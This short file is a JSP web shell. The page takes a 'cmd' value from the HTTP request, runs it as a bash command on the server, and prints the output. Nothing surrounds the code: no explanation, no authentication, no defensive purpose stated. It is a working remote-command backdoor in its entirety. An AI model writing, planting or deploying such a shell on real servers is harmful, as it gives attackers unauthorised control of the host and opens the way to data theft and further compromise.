<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", cmd);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
    p.waitFor();
}
%>
